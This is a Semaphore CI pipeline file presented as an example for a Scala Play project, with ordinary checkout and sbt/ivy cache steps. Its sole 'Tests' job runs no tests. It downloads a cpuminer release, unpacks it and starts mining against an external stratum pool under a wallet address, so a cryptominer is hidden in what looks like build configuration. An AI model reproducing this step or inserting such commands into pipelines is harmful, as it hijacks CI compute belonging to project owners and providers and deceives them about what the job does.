version: v1.0
name: Semaphore example for Scala Play
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
blocks:
  - name: Scala with Play
    task:
      env_vars:
        - name: SCALA_VERSION
          value: 2.12.6
      prologue:
        commands:
          - cd $HOME
          - ls -lah
          - checkout
          - sem-version scala 2.12
          - 'cache restore sbt-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH-$(checksum $SEMAPHORE_PROJECT_NAME/build.sbt),sbt-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH,sbt-java$JAVA_VERSION-master'
          - 'cache restore ivy2-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH-$(checksum $SEMAPHORE_PROJECT_NAME/build.sbt),ivy2-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH,ivy2-java$JAVA_VERSION-master'
          - 'cache restore gradle-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH-$(checksum $SEMAPHORE_PROJECT_NAME/build.sbt),gradle-java$JAVA_VERSION-$SEMAPHORE_GIT_BRANCH,gradle-java$JAVA_VERSION-master'
      jobs:
        - name: Tests
          matrix:
            - env_var: JAVA_VERSION
              values:
                - '8'
                - '11'
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
